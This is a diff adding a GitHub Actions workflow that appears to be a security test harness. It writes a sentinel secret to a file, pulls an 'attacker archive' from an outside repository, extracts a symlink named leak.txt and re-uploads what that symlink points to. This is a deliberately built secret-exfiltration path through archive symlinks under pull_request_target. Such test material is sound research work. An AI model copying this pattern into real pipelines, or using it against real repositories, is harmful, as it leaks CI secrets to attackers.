@@ -1,0 +1,42 @@
+name: G01 archive finalizer
+
+on:
+  workflow_dispatch:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  finalize:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create protected file
+        env:
+          PROTECTED_VALUE: ${{ secrets.G01_PROTECTED_ARCHIVE_SENTINEL }}
+        run: |
+          rm -rf protected incoming
+          mkdir -p protected incoming/payload
+          printf "%s\n" "$PROTECTED_VALUE" > protected/protected.txt
+          printf "%s\n" "G01_TRUSTED_CONTROL_20260803_LION" > protected/control.txt
+      - name: Download attacker archive
+        uses: actions/download-artifact@v4
+        with:
+          name: g01-symlink-archive-20260803-a3
+          repository: apexblack-tiger-60359447/tiger-pr-source-20260803
+          run-id: 30862273163
+          github-token: ${{ github.token }}
+          path: incoming
+      - name: Extract attacker archive
+        run: |
+          mkdir -p incoming/payload
+          tar -xf incoming/payload.tar -C incoming/payload
+          test -L incoming/payload/leak.txt
+          printf "%s\n" "archive_symlink_extracted=true"
+      - name: Repackage extracted result
+        uses: actions/upload-artifact@v4
+        with:
+          name: g01-finalized-archive-20260803-lion
+          path: incoming/payload/leak.txt
